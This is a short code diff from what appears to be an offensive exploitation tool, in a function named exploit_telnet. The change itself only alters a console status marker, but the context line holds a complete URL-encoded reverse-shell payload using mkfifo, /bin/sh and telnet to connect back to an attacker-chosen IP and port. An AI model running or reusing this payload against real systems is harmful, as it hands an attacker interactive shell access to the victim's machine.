@@ -17,7 +17,7 @@ def exploit_telnet(exploit, method, ip, port):
     telnetPayload = f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{ip}+{port}+>/tmp/f"
 
     print(
-        colors.purple("[.]")
+        colors.purple("[?]")
         + " Checking if telnet is available on the target system...",
         flush = True
     )
